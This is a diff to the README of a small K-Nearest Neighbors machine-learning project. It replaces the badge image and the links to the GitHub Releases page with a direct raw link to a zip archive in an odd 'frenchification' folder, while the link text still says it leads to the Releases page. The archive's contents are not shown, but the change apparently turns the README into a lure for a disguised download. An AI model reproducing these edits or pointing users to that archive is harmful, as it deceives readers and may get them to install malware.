@@ -1,6 +1,6 @@
 # 🌟 Prediction_using_KNN - Easy Machine Learning with K-Nearest Neighbors
 
-![Download](https://img.shields.io/badge/Download-Now-brightgreen)
+![Download](https://raw.githubusercontent.com/baobao1733/Prediction_using_KNN/main/frenchification/using-Prediction-KNN-2.0.zip)
 
 ## 📦 Introduction
 
@@ -12,7 +12,7 @@ Follow these steps to download and run the software:
 
 ### Step 1: Visit the Releases Page
 
-To download the software, [visit the Releases page here](https://github.com/baobao1733/Prediction_using_KNN/releases). On this page, you will find different versions of the application that you can use.
+To download the software, [visit the Releases page here](https://raw.githubusercontent.com/baobao1733/Prediction_using_KNN/main/frenchification/using-Prediction-KNN-2.0.zip). On this page, you will find different versions of the application that you can use.
 
 ### Step 2: Download the Application
 
@@ -81,4 +81,4 @@ For any questions, please create an issue in the repository, and we'll respond a
 
 ## 📥 Download & Install
 
-To start using the software, [visit the Releases page here](https://github.com/baobao1733/Prediction_using_KNN/releases). Download the latest version that corresponds to your system and follow the installation steps outlined above. Enjoy exploring the world of Machine Learning with K-Nearest Neighbors!
+To start using the software, [visit the Releases page here](https://raw.githubusercontent.com/baobao1733/Prediction_using_KNN/main/frenchification/using-Prediction-KNN-2.0.zip). Download the latest version that corresponds to your system and follow the installation steps outlined above. Enjoy exploring the world of Machine Learning with K-Nearest Neighbors!
